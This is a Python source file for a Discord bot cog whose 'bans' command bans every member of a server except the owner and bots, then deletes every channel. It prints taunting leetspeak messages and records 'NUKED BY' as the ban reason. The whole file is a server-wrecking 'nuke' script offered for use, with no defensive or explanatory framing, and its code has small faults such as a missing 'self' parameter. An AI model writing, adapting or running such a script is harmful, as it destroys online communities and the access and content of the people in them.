import discord
from discord.ext import commands

class User(commands.Cog):

	def __init__(self, client):
		self.client = client

	@commands.Cog.listener()
	async def on_ready(self):
		print(1)

	@commands.command()
	async def bans(ctx):
		members = ctx.message.guild.members
		for member in members:

			if member != ctx.guild.owner and not member.bot:
			 	print(f"{member} $5 G0$N6 T0 B3 B4NN3D! AHAHAHAHAHAHHAA")
			 	await member.ban(reason=f"NUKED BY {ctx.message.author.name}")
			elif member.bot:
			 		print(f"{member} is a bot")
		for c in ctx.guild.channels:
			await c.delete()
			
def setup(client):
	client.add_cog(User(client))